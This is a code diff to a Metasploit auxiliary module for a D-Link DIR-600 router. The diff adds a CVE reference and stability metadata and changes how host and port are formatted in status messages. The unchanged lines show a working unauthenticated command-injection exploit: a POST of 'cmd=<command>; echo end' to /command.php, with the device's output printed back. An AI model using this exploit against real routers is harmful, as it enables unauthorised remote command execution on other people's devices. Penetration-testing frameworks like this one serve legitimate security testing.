@@ -22,13 +22,19 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
         'License' => MSF_LICENSE,
         'References' => [
+          [ 'CVE', '2013-10069' ],
           [ 'OSVDB', '89861' ],
           [ 'EDB', '24453' ],
           [ 'URL', 'https://eu.dlink.com/uk/en/products/dir-600-wireless-n-150-home-router' ],
           [ 'URL', 'http://www.s3cur1ty.de/home-network-horror-days' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-003' ]
         ],
-        'DisclosureDate' => '2013-02-04'
+        'DisclosureDate' => '2013-02-04',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -43,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     uri = '/command.php'
 
-    print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending remote command: " + datastore['CMD'])
 
     data_cmd = "cmd=#{datastore['CMD']}; echo end"
 
@@ -56,19 +62,19 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
       return if res.nil?
-      return if (res.headers['Server'].nil? || res.headers['Server'] !~ (%r{Linux,\ HTTP/1.1,\ DIR}))
+      return if res.headers['Server'].nil? || res.headers['Server'] !~ %r{Linux,\ HTTP/1.1,\ DIR}
       return if res.code == 404
     rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to connect to the web server")
       return
     end
 
     if res.body.include?('end')
-      print_good("#{rhost}:#{rport} - Exploited successfully\n")
-      print_line("#{rhost}:#{rport} - Command: #{datastore['CMD']}\n")
-      print_line("#{rhost}:#{rport} - Output: #{res.body}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Exploited successfully\n")
+      print_line("#{Rex::Socket.to_authority(rhost, rport)} - Command: #{datastore['CMD']}\n")
+      print_line("#{Rex::Socket.to_authority(rhost, rport)} - Output: #{res.body}")
     else
-      print_error("#{rhost}:#{rport} - Exploit failed")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Exploit failed")
     end
   end
 end
